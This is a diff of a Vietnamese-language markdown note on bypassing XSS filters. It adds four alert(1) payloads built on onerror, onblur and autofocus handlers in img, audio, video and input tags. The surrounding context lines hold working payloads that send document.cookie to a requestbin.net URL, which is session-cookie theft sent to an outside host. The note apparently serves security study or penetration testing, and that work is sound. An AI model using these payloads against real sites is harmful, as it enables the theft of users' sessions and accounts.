@@ -46,6 +46,14 @@ Tùy thuộc vào cơ chế filter mà có các cách bypass khác nhau. Nếu v
 
 ```<audio src=1 onerror=alert(1)>```
 
+```<img src=1 href=1 onerror="javascript:alert(1)"></img>```
+
+```<audio src=1 href=1 onerror="javascript:alert(1)"></audio>```
+
+```<video src=1 href=1 onerror="javascript:alert(1)"></video>```
+
+```<input onblur=javascript:alert(1) autofocus><input autofocus>```
+
 ```<button autofocus onfocus=window.location="http://requestbin.net/r/5h067g6l?c=".concat(document.cookie)></button>```
 
 ```<a onmouseover=window.location="http://requestbin.net/r/5h067g6l?c=".concat(document.cookie)>xxs link</a>```
